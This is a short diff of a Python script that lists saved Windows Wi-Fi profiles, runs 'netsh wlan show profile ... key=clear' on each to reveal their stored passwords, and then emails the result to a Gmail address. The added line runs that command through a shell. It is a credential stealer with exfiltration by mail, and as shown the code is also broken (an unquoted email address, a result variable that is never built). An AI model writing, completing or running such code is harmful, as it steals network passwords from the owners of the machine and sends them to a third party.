@@ -20,6 +20,7 @@ network_names_list = re.findall("(Profile\s*:\s)(.*)", networks)
 
 for network_name in network_names_list:
     command = "netsh wlan show profile " + network_name + " key=clear"
+    current_result = subprocess.check_output(command, shell=True)
     print(network_name)
 
 send_mail(name@gmail.com, "password123", result)
